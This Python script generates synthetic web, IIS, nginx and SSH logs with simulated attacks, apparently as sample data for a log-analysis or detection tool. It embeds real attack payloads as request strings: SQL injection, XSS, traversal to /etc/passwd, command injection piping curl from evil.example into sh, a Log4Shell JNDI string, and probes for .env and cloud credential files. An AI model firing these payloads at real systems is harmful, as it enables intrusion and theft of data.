#!/usr/bin/env python3
"""Generate demo logs with realistic attacks, one file per format.

All IPs are from documentation ranges (RFC 5737 / RFC 3849) so the samples
never point at a real person. Run:  python tools/make_samples.py
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"
random.seed(7)
T0 = datetime(2026, 3, 14, 9, 0, 0)

USERS = ["198.51.100.17", "198.51.100.23", "203.0.113.9", "203.0.113.42", "192.0.2.88"]
BROWSER = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
           "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/124.0 Mobile Safari/537.36"]
PAGES = ["/", "/index.html", "/products", "/products/42", "/cart", "/api/v1/orders?page=2",
         "/assets/app.css", "/assets/app.js", "/favicon.ico", "/about", "/contact"]

SQLI = ["/products?id=1%27%20OR%20%271%27=%271", "/products?id=1+UNION+SELECT+username,password+FROM+users--",
        "/search?q=%27%3BDROP%20TABLE%20users%3B--", "/products?id=1%20AND%20SLEEP(5)",
        "/api/v1/orders?page=1%20union%20all%20select%20null,table_name%20from%20information_schema.tables"]
XSS = ["/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
       "/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E", "/profile?name=javascript:alert(1)"]
TRAV = ["/download?file=../../../../etc/passwd", "/static/..%2f..%2f..%2fetc%2fshadow",
        "/index.php?page=php://filter/convert.base64-encode/resource=index"]
CMDI = ["/ping?host=127.0.0.1;cat%20/etc/passwd", "/cgi-bin/test.sh?x=%60whoami%60",
        "/api/exec?cmd=$(curl%20http://evil.example/x.sh|sh)"]
PROBES = ["/.env", "/.git/config", "/wp-config.php.bak", "/phpinfo.php", "/server-status",
          "/backup.sql", "/wp-login.php", "/phpmyadmin/", "/admin", "/.aws/credentials",
          "/actuator/env", "/config.json", "/xmlrpc.php", "/administrator/"]


def clf(ts):
    return ts.strftime("%d/%b/%Y:%H:%M:%S +0000")


def combined_line(ip, ts, method, path, status, size, ua, ref="-"):
    return f'{ip} - - [{clf(ts)}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def web_events():
    """Yield (ip, ts, method, path, status, size, ua) in time order."""
    ev = []
    # normal traffic across 6 hours
    for i in range(900):
        ts = T0 + timedelta(seconds=random.randint(0, 6 * 3600))
        ip = random.choice(USERS)
        path = random.choice(PAGES)
        status = random.choices([200, 304, 404, 301], [80, 12, 5, 3])[0]
        ev.append((ip, ts, "GET", path, status, random.randint(300, 9000), random.choice(BROWSER)))
    # sqlmap attacker
    t = T0 + timedelta(hours=1, minutes=12)
    for i, p in enumerate(SQLI * 4):
        ev.append(("203.0.113.66", t + timedelta(seconds=i * 3), "GET", p,
                   random.choice([200, 500]), 512, "sqlmap/1.8.3#stable (https://sqlmap.org)"))
    # XSS + traversal by a browser-looking attacker
    t = T0 + timedelta(hours=2, minutes=3)
    for i, p in enumerate(XSS + TRAV):
        ev.append(("198.51.100.200", t + timedelta(seconds=i * 20), "GET", p, 400, 210, BROWSER[0]))
    # command injection + log4shell in UA
    t = T0 + timedelta(hours=2, minutes=40)
    for i, p in enumerate(CMDI):
        ev.append(("192.0.2.150", t + timedelta(seconds=i * 7), "GET", p, 403, 199, "curl/8.4.0"))
    ev.append(("192.0.2.150", t + timedelta(minutes=2), "GET", "/", 200, 400,
               "${jndi:ldap://evil.example/a}"))
    # dir scanner: gobuster spraying 404s
    t = T0 + timedelta(hours=3, minutes=5)
    words = ["old", "test", "dev", "tmp", "bak", "secret", "private", "uploads", "files", "db",
             "staging", "v2", "internal", "debug", "hidden", "logs", "cgi", "data", "beta", "conf"]
    for i, w in enumerate(words + PROBES):
        ev.append(("203.0.113.77", t + timedelta(seconds=i), "GET", "/" + w.lstrip("/"),
                   404, 162, "gobuster/3.6"))
    # web login brute force, then success
    t = T0 + timedelta(hours=4, minutes=20)
    for i in range(14):
        ev.append(("198.51.100.99", t + timedelta(seconds=i * 4), "POST", "/login", 401, 320,
                   "python-requests/2.32.3"))
    ev.append(("198.51.100.99", t + timedelta(seconds=60), "POST", "/login", 302, 0,
               "python-requests/2.32.3"))
    ev.append(("198.51.100.99", t + timedelta(seconds=62), "GET", "/admin/users", 200, 8800,
               "python-requests/2.32.3"))
    # HTTP flood
    t = T0 + timedelta(hours=5, minutes=1)
    for i in range(260):
        ev.append(("192.0.2.201", t + timedelta(milliseconds=i * 200), "GET", "/products",
                   200, 4100, "Go-http-client/1.1"))
    # odd methods + empty UA
    t = T0 + timedelta(hours=5, minutes=30)
    for i, m in enumerate(["TRACE", "PROPFIND", "PUT", "CONNECT"]):
        ev.append(("203.0.113.120", t + timedelta(seconds=i * 9), m, "/", 405, 0, "-"))
    ev.sort(key=lambda e: e[1])
    return ev


def write_combined(events):
    lines = [combined_line(*e) for e in events]
    (OUT / "web_access.log").write_text("\n".join(lines) + "\n", encoding="utf-8")


def write_json(events):
    lines = [json.dumps({"time": ts.strftime("%Y-%m-%dT%H:%M:%S+00:00"), "remote_addr": ip,
                         "request_method": m, "request_uri": p, "status": s,
                         "body_bytes_sent": z, "http_user_agent": ua})
             for ip, ts, m, p, s, z, ua in events[::3]]
    (OUT / "nginx_json.log").write_text("\n".join(lines) + "\n", encoding="utf-8")


def write_iis(events):
    head = ["#Software: Microsoft Internet Information Services 10.0", "#Version: 1.0",
            f"#Date: {T0:%Y-%m-%d %H:%M:%S}",
            "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username "
            "c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes time-taken"]
    rows = []
    for ip, ts, m, p, s, z, ua in events[::4]:
        stem, _, q = p.partition("?")
        rows.append(f"{ts:%Y-%m-%d %H:%M:%S} 10.0.0.5 {m} {stem} {q or '-'} 443 - {ip} "
                    f"{ua.replace(' ', '+') if ua != '-' else '-'} - {s} 0 0 {z} {random.randint(5, 900)}")
    (OUT / "iis_u_ex260314.log").write_text("\n".join(head + rows) + "\n", encoding="utf-8")


def write_ssh():
    lines = []
    t = T0
    def add(dt, msg):
        lines.append(((t + dt), f"{(t + dt):%b %d %H:%M:%S} web01 sshd[{random.randint(1000, 9999)}]: {msg}"))
    for i in range(6):
        add(timedelta(minutes=i * 40), f"Accepted publickey for deploy from 198.51.100.17 port {50000 + i} ssh2")
    names = ["root", "admin", "test", "oracle", "ubuntu", "pi", "postgres", "git", "user", "guest"]
    for i, n in enumerate(names * 2):
        prefix = "" if n in ("root", "ubuntu") else "invalid user "
        if prefix:
            add(timedelta(hours=1, seconds=i * 6), f"Invalid user {n} from 203.0.113.5 port {40000 + i}")
        add(timedelta(hours=1, seconds=i * 6 + 1),
            f"Failed password for {prefix}{n} from 203.0.113.5 port {40000 + i} ssh2")
    # slow-and-low then success = compromise
    for i in range(7):
        add(timedelta(hours=3, seconds=i * 30), f"Failed password for ubuntu from 192.0.2.44 port {41000 + i} ssh2")
    add(timedelta(hours=3, minutes=4), "Accepted password for ubuntu from 192.0.2.44 port 41999 ssh2")
    add(timedelta(hours=3, minutes=5), "pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)")
    for i in range(3):
        add(timedelta(hours=4, seconds=i * 50), f"Failed password for deploy from 198.51.100.17 port {52000 + i} ssh2")
    add(timedelta(hours=5), "Disconnected from invalid user admin 203.0.113.5 port 40100 [preauth]")
    lines.sort()
    (OUT / "auth.log").write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")


def write_nginx_error():
    rows = [
        (0, "error", 'open() "/usr/share/nginx/html/.env" failed (2: No such file or directory)', "203.0.113.77", "GET /.env HTTP/1.1"),
        (5, "error", 'open() "/usr/share/nginx/html/wp-login.php" failed (2: No such file or directory)', "203.0.113.77", "GET /wp-login.php HTTP/1.1"),
        (60, "error", 'access forbidden by rule', "198.51.100.200", "GET /download?file=../../../../etc/passwd HTTP/1.1"),
        (120, "warn", 'client sent invalid method while reading client request line', "192.0.2.150", "\\x16\\x03\\x01"),
        (300, "error", 'upstream timed out (110: Connection timed out) while reading response header from upstream', "198.51.100.17", "GET /api/v1/orders?page=2 HTTP/1.1"),
        (900, "error", 'directory index of "/usr/share/nginx/html/uploads/" is forbidden', "203.0.113.77", "GET /uploads/ HTTP/1.1"),
    ]
    out = []
    for i, (s, lvl, msg, ip, req) in enumerate(rows):
        ts = T0 + timedelta(hours=3, seconds=s)
        out.append(f'{ts:%Y/%m/%d %H:%M:%S} [{lvl}] 1234#1234: *{100 + i} {msg}, client: {ip}, '
                   f'server: shop.example, request: "{req}", host: "shop.example"')
    (OUT / "nginx_error.log").write_text("\n".join(out) + "\n", encoding="utf-8")


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    events = web_events()
    write_combined(events)
    write_json(events)
    write_iis(events)
    write_ssh()
    write_nginx_error()
    print(f"Samples written to {OUT}")
